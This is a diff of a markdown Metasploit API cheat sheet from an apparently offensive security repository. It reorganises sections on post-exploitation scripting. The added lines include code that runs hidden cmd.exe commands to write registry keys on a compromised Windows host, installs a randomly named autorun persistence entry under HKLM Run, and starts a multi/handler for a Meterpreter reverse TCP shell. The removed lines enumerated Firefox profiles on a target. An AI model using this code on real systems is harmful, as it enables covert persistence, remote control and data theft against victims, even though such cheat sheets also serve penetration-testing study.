@@ -14,7 +14,8 @@
 | various checks | [various checks ](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#various-checks) | mul = client.framework.exploits.create("multi/handler") |
 | ruby string manipulation | [ruby string manipulation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#ruby-string-manipulation) | parse = datastore['remote_path'].gsub('\\','\\\\') |
 | listing remote processes | [listing remote processes](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#listting-remote-processes) | session.sys.process.get_processes().each do \|x\| |
-| various operations | [various operations](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#various-operations) | tbl = Rex::Ui::Text::Table.new('') |
+| store loot | [store loot (local)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#store-loot) | tbl = Rex::Ui::Text::Table.new('') |
+| manipulate registry | [manipulate regedit (remote)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#manipulate-registry) |  |
 | writting exploits | [writting exploits](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#writing-exploits) | exeTEMPLATE = %{ #include <stdio.h> }, |
 
 <br />
@@ -413,7 +414,7 @@ system along with the details like IP, netmask, mac_address etc.
 
 <br /><br /><br />
 
-## ruby string manipulation
+## RUBY STRING MANIPULATION
 
 - **Using .slice() to extract chars**
 <blockquote> The slice method lets you grab a single character or a range of characters. Passing a single integer returns the character at that index. Passing two integers, separated by a comma, tells slice to return all the characters from the first index to the last index, inclusive. The slice method also accepts a range, such as 1..4, to specify the characters to extract:</blockquote>
@@ -640,7 +641,7 @@ system along with the details like IP, netmask, mac_address etc.
 
 <br /><br /><br />
 
-## VARIOUS OPERATIONS
+## STORE LOOT
 
 - **store data in loot folder (local)**
 
@@ -673,84 +674,38 @@ system along with the details like IP, netmask, mac_address etc.
         )
       print_status("System info gather ..")
 
-- **start a multi handler (local)**
-
-      mul = client.framework.exploits.create("multi/handler")
-      mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
-      mul.datastore['LHOST']     = rhost
-      mul.datastore['LPORT']     = rport
-      mul.datastore['EXITFUNC']  = 'process'
-      mul.datastore['ExitOnSession'] = false
-
-      mul.exploit_simple(
-        'Payload'        => mul.datastore['PAYLOAD'],
-        'RunAsJob'       => true
-      )
-      end
-
-- **try to fill a table**
-
-      # building table display
-      tbl = Rex::Ui::Text::Table.new(
-        'Header'  => 'Interfaces Active',
-        'Indent'  => 1,
-        'Columns' =>
-      [
-          'wlan',
-          'lan'
-      ])
- 
-      # Gather target user data
-      file1 = client.fs.file.new("%temp%\\dum.txt")
-           vtemp = ""
-           until file1.eof?
-           vtemp << file.read
- 
-      # Store in tables and print results on screen
-      tbl << [vtemp]
-      print_line("\n" + tbl.to_s + "\n")
-
-      def check_firefox_win(path)
-          paths  = []
-          ffpath = []
-          path = path + "\\Mozilla\\"
-      print_status("Checking for Firefox profile in: #{path}")
-
-      stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
-      if !stat
-        print_error("Firefox was not found (Missing profiles.ini)")
-        return
-      end
-
-      session.fs.dir.foreach(path) do |fdir|
-        print_status("Found a Firefox directory: #{path + fdir}")
-        ffpath << path + fdir
-        break
-      end
-
-      if ffpath.empty?
-        print_error("Firefox was not found")
-        return
-      end
-
-      #print_status("Locating Firefox profiles")
-      path << "Firefox\\Profiles\\"
-
-      # We should only have profiles in the Profiles directory store them all
-      begin
-      session.fs.dir.foreach(path) do |pdirs|
-        next if pdirs == "." or pdirs == ".."
-        vprint_good("Found profile: #{path + pdirs}")
-        paths << path + pdirs
-      end
-      rescue
-        print_error("Profiles directory is missing")
-        return
-      end
-      paths.empty? ? (nil) : (paths)
-      end
-
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
+
+---
+
+<br /><br /><br />
+
+## MANIPULATE REGEDIT
+
+- **Read remote registry key and store results in local var**
+
+      scrnsave_active = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveActive')
+      print_good("ScreenSaveActive: #{scrnsave_active}")
+
+- **write reg key remote**
+'execute cmd prompt in a **hidden** channelized windows'<br />
+
+      cmd = "HKCU\\Contol Panel\\Desktop /v ScreenSaveActive /t REG_SZ /d 1 /f"
+      r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+      print_warning("Hijack key: #{cmd}")
+
+- **write reg key remote**
+
+      nam = Rex::Text.rand_text_alpha(rand(8)+8)
+      print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+      key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
+        if(key)
+          key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
+          print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+        else
+          print_status("Error: failed to open the registry key for writing")
+        end
+      end
 
 ---
 
@@ -831,17 +786,20 @@ system along with the details like IP, netmask, mac_address etc.
         print_error("Error: #{$!}\n\n#{$@.join("\n")}")
       end
 
-- **write reg key remote**
 
-      nam = Rex::Text.rand_text_alpha(rand(8)+8)
-      print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-      key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
-        if(key)
-          key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
-          print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-        else
-          print_status("Error: failed to open the registry key for writing")
-        end
+- **start a multi handler (local)**
+
+      mul = client.framework.exploits.create("multi/handler")
+      mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
+      mul.datastore['LHOST']     = rhost
+      mul.datastore['LPORT']     = rport
+      mul.datastore['EXITFUNC']  = 'process'
+      mul.datastore['ExitOnSession'] = false
+
+      mul.exploit_simple(
+        'Payload'        => mul.datastore['PAYLOAD'],
+        'RunAsJob'       => true
+      )
       end
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
